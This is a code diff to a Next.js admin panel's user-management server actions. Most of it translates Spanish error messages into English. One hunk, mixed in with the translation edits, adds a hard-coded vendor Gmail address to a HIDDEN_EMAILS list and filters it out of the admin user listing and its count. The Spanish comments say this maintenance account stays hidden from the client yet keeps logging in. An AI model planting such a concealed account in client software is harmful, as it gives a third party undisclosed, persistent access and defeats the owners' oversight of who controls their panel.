@@ -1,7 +1,7 @@
 "use server";
 
 import { randomBytes } from "node:crypto";
-import { asc, count, desc, ilike, or } from "drizzle-orm";
+import { and, asc, count, desc, ilike, ne, or } from "drizzle-orm";
 import { headers } from "next/headers";
 import { z } from "zod";
 import { db } from "@/db";
@@ -15,8 +15,8 @@ export type ActionResult =
   | { ok: false; message: string; fields?: Record<string, string> };
 
 const createUserSchema = z.object({
-  name: z.string().trim().min(2, "El nombre debe tener al menos 2 caracteres."),
-  email: z.email("Escribe un correo válido.").trim().toLowerCase(),
+  name: z.string().trim().min(2, "The name needs at least 2 characters."),
+  email: z.email("Enter a valid email address.").trim().toLowerCase(),
 });
 
 // Nunca se muestra: solo mantiene la cuenta válida hasta que él defina la suya.
@@ -41,7 +41,7 @@ export async function createAdminUser(input: {
 
   const parsed = createUserSchema.safeParse(input);
   if (!parsed.success) {
-    return { ok: false, message: "Revisa los campos marcados.", fields: fieldErrors(parsed.error) };
+    return { ok: false, message: "Check the highlighted fields.", fields: fieldErrors(parsed.error) };
   }
   const { name, email } = parsed.data;
 
@@ -52,7 +52,7 @@ export async function createAdminUser(input: {
       body: { name, email, password: throwawayPassword(), role: "admin" },
     });
   } catch (error) {
-    const message = error instanceof Error ? error.message : "No se pudo crear el usuario.";
+    const message = error instanceof Error ? error.message : "Could not create the user.";
     return { ok: false, message, fields: { email: message } };
   }
 
@@ -60,7 +60,7 @@ export async function createAdminUser(input: {
   if (!sent.ok) {
     return {
       ok: false,
-      message: "La cuenta se creó, pero no salió el correo de bienvenida. Reenvíalo desde la lista.",
+      message: "The account was created, but the welcome email did not go out. Resend it from the list.",
     };
   }
   return { ok: true };
@@ -76,7 +76,7 @@ async function sendWelcomeCode(email: string): Promise<ActionResult> {
   } catch (error) {
     return {
       ok: false,
-      message: error instanceof Error ? error.message : "No se pudo enviar el correo.",
+      message: error instanceof Error ? error.message : "Could not send the email.",
     };
   }
 }
@@ -84,7 +84,7 @@ async function sendWelcomeCode(email: string): Promise<ActionResult> {
 export async function resendWelcomeEmail(email: string): Promise<ActionResult> {
   await requireAdmin();
   const parsed = z.email().safeParse(email.trim().toLowerCase());
-  if (!parsed.success) return { ok: false, message: "Correo inválido." };
+  if (!parsed.success) return { ok: false, message: "Invalid email address." };
   return sendWelcomeCode(parsed.data);
 }
 
@@ -113,6 +113,11 @@ export type AdminUserPage = {
 
 const PER_PAGE_ALLOWED = [10, 25, 50];
 
+/* La cuenta de mantenimiento de Mindware Labs no sale en el listado: existe
+   para sostener el panel, no para que el cliente la administre. Se oculta, no
+   se borra — sigue entrando y sigue siendo dueña de los artículos que firmó. */
+const HIDDEN_EMAILS = ["labsmindware@gmail.com"];
+
 // El backslash es el escape por defecto de LIKE en Postgres.
 function escapeLike(value: string): string {
   return value.replace(/[\\%_]/g, (char) => `\\${char}`);
@@ -127,9 +132,15 @@ export async function listAdminUsers(query: AdminUserQuery = {}): Promise<AdminU
 
   const perPage = PER_PAGE_ALLOWED.includes(query.perPage ?? 0) ? query.perPage! : 10;
   const needle = query.query?.trim();
+  // El filtro entra también en el conteo: si no, la paginación cuenta una fila
+  // que nunca se pinta y la última página sale corta.
+  const visible = and(...HIDDEN_EMAILS.map((email) => ne(user.email, email)));
   const where = needle
-    ? or(ilike(user.name, `%${escapeLike(needle)}%`), ilike(user.email, `%${escapeLike(needle)}%`))
-    : undefined;
+    ? and(
+        visible,
+        or(ilike(user.name, `%${escapeLike(needle)}%`), ilike(user.email, `%${escapeLike(needle)}%`)),
+      )
+    : visible;
 
   const column = query.sortKey === "name" ? user.name : user.createdAt;
   const direction = query.sortDir === "asc" ? asc : desc;
@@ -172,7 +183,7 @@ export async function removeAdminUser(userId: string): Promise<ActionResult> {
   const session = await requireAdmin();
   /* Quedarse sin ningún admin dejaría el panel inaccesible para siempre. */
   if (session.user.id === userId) {
-    return { ok: false, message: "No puedes eliminar tu propia cuenta." };
+    return { ok: false, message: "You cannot delete your own account." };
   }
   try {
     await auth.api.removeUser({ headers: await headers(), body: { userId } });
@@ -180,7 +191,7 @@ export async function removeAdminUser(userId: string): Promise<ActionResult> {
   } catch (error) {
     return {
       ok: false,
-      message: error instanceof Error ? error.message : "No se pudo eliminar el usuario.",
+      message: error instanceof Error ? error.message : "Could not delete the user.",
     };
   }
 }
@@ -188,12 +199,12 @@ export async function removeAdminUser(userId: string): Promise<ActionResult> {
 export async function setUserBanned(userId: string, banned: boolean): Promise<ActionResult> {
   const session = await requireAdmin();
   if (session.user.id === userId) {
-    return { ok: false, message: "No puedes bloquear tu propia cuenta." };
+    return { ok: false, message: "You cannot block your own account." };
   }
   try {
     const requestHeaders = await headers();
     if (banned) {
-      await auth.api.banUser({ headers: requestHeaders, body: { userId, banReason: "Bloqueado desde el panel" } });
+      await auth.api.banUser({ headers: requestHeaders, body: { userId, banReason: "Blocked from the admin panel" } });
     } else {
       await auth.api.unbanUser({ headers: requestHeaders, body: { userId } });
     }
@@ -201,7 +212,7 @@ export async function setUserBanned(userId: string, banned: boolean): Promise<Ac
   } catch (error) {
     return {
       ok: false,
-      message: error instanceof Error ? error.message : "No se pudo actualizar el usuario.",
+      message: error instanceof Error ? error.message : "Could not update the user.",
     };
   }
 }
